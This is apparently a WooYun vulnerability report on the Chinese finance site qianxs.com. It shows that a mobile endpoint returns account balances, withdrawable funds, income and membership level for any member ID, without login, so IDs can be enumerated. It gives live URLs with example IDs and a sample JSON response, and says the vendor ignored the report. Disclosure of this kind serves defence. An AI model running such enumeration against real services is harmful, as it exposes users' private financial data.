wybug_title: 钱先生未授权访问+遍历涉及用户敏感信息泄露（可查看账户总资金、可取资金、账户等级及未读消息条数等）
wybug_corp: 钱先生（上海)金融信息服务有限公司
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-11-05：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-12-20：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  无需登录直接访问http://www.qianxs.com/mrMoney/mobile/invite/member/queryInvestStatV2.html?mId=MR03010000http://www.qianxs.com/mrMoney/mobile/invite/member/queryInvestStatV2.html?mId=MR03133445


{"sumInvestMoney":0,"CurrentFinanceInt":"2.74","currNetDate":"2015-11-04","DaySeqNo":"千里之外","currentInvestMoney":0,"currentInvestMoneyV2":0,"balanceV2":0,"todayIncome":0,"loadMoney":0,"balance":0,"fixAccount":0,"officialBalance":0,"drawMoney":0,"canInvestMoney":0,"canDrawMoney":0,"presentMoney":0,"fCyclBal":"0","cyclBal":0,"accmInt":0,"Real7Int":"4.26","sumIncomeMoney":0,"currentIncomeMoney":0,"yestodayIncome":0,"QbbAssets":0,"QbbAssets1":0,"QbbAssets2":0,"QbbPrincipal":0,"QbbPrincipal1":0,"QbbPrincipal2":0,"DQAvgRate":"0.00","AllAvgRate":"0.00","HQAvgRate":"4.26","result":"0","message":"操作成功","currentTimeStamp":"2015-11-05 13:27:08","userCount":300000,"noUseCoupons":0,"currentProductName":"添金宝","currentBankLogo":"cbhb","currentBankName":"渤海银行","HQMessage":"当天14:00前转入，t+2个工作日起计息，t+3工作日起每日收益存入钱宝宝账户","custLevel":"","idcard_honor":"","cntUnreadSiteMsg":0}
多个id对比可知道，各参数意义里面有可提现金canDrawMoney，收益sumIncomeMoney，会员等级custLevel，账号等级idcard_honor，未读信息cntUnreadSiteMsg。   漏洞证明：  http://www.qianxs.com/mrMoney/mobile/invite/member/queryInvestStatV2.html?mId=MR03010000
